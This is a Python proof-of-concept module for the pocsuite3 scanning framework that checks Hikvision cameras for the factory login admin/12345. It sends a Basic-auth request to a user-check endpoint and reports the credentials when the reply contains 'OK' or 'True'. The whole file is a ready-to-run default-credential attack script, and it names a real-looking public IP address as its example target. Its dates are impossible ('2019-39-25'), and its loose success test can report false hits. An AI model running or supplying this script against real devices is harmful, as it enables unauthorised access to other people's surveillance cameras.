#!/usr/bin/env python
# -*- coding: utf-8 -*-

from urllib.parse import urljoin
import base64
from pocsuite3.api import requests, POCBase,logger,Output,register_poc
import base64


class WeakPassPOC(POCBase):
    vulID = ''
    version = '1.0'
    author = ['Totora']
    vulDate = '2019-39-25'
    createDate = '2019-39-25'
    name = 'hikvision'
    appName = 'hikvision'
    appPowerLink = ''
    appVersion = ''
    vulType = 'weak-pass'
    example = 'http://91.224.179.196:8088'
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    def _verify(self):
        path = '/PSIA/Custom/SelfExt/userCheck'
        url = urljoin(self.url, path)
        default_user = 'admin'
        default_pass = '12345'
        auth_str_tmp = default_user+':'+default_pass
        auth_str = base64.b64encode(auth_str_tmp.encode('utf-8')).decode('utf-8')
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
            'Authorization': 'Basic {}'.format(auth_str)
        }
        result = {}
        try:
            res = requests.get(url,headers=headers)
            if 'OK' in res.text or 'True' in res.text:
                result['AdminInfo'] = {}
                result['AdminInfo']['Username'] = 'admin'
                result['AdminInfo']['Password'] = '12345'
        except Exception as e:
            logger.info(str(e))
        return self.parse_output(result)

    def _attack(self):
        return self._verify()
    def _shell(self):
        return self._verify()

register_poc(WeakPassPOC)
        

